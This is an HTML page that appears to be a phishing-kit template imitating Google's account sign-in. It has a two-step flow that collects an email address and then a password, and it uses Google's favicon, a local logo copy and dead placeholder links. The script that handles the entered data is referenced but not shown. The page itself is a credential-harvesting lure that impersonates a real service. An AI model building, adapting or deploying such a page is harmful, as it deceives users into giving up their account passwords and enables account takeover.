<!DOCTYPE html>
<html>

    <head>

        <title> Sign in - Google accounts </title>

        <meta name="viewport" content="width=device-width,inital-scale=1,user-scalable=no">

        <link href="./css/all.min.css" rel="stylesheet">
        <link href="./css/style.css" rel="stylesheet">
        <link rel="shortcut icon" href="//www.google.com/favicon.ico">


        <script src="./js/jquery.min.js"></script>
        <script src="./js/main.js"></script>
        <script src="./js/all.min.js"></script>

    </head>

    <body>

        <div class="form_body">

            <div class="form_actual" id="email_seat">

                <img src="./img/logo.png">

                <h4> Sign in </h4>

                <h6> Use your Google Account </h6>

                <form role="form">

                    <fieldset>
                        <legend> Email or phone </legend>
                        <input type="text" placeholder="Email or phone" id="login">
                    </fieldset>

                    <div class="left">
                        <a href="#" class="forgot"> Forgot email? </a>
                    </div>

                    <div class="clear"></div>

                    <p> Not your computer? Use a private browsing window to sign in. <a href="#">Learn more</a> </p>

                    <div class="extra_under">
                        <div class="right">
                            <button id="email_submit"> Next </button>
                        </div>

                        <div class="left">
                            <a href="#" class="create"> Create account </a>
                        </div>

                        <div class="clear"></div>
                    </div>

                </form>

            </div>

            <div class="form_actual hidden" id="password_seat">

                <img src="./img/logo.png">

                <h4> Welcome </h4>

                <div class="h5_handler">
                    <h5> <i class="fa fa-user"></i> yourownemail@domain.com <i class="fa fa-chevron-down"></i> </h5>
                </div>
                <form role="form">

                    <fieldset>
                        <legend> Enter your password </legend>
                        <input type="text" placeholder="Enter your password" id="password">
                    </fieldset>

                    <!-- <div class="left">
                        <label><input type="checkbox"> Show password </label>
                    </div> -->

                    <div class="clear"></div>

                    <div class="extra_under">
                        <div class="right">
                            <button id="full_submit"> Next </button>
                        </div>

                        <div class="left">
                            <a href="#" class="create"> Forgot password? </a>
                        </div>

                        <div class="clear"></div>
                    </div>

                </form>

            </div>

            <div class="outside_form">

                <div class="right">
                    <a href="#"> Help </a>
                    <a href="#"> Privacy </a>
                    <a href="#"> Terms </a>
                </div>

                <div class="left">
                    <a href="#"> English (United Kingdom) <i class="fa fa-chevron-down"></i> </a>
                </div>

            </div>

        </div>

    </body>

</html>
